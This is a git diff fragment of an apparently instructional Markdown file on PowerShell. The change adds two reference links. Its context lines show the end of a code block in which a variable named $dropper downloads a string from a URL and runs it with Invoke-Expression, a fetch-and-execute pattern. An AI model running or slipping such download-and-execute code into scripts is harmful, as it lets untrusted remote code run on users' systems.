@@ -106,4 +106,7 @@ $dropper= $client.DownloadString($url)
 Invoke-Expression $dropper 
 ```
 
+References:
+- [https://ss64.com/ps/powershell.html](https://ss64.com/ps/powershell.html)
+- [https://github.com/ab14jain/PowerShell](https://github.com/ab14jain/PowerShell)
 
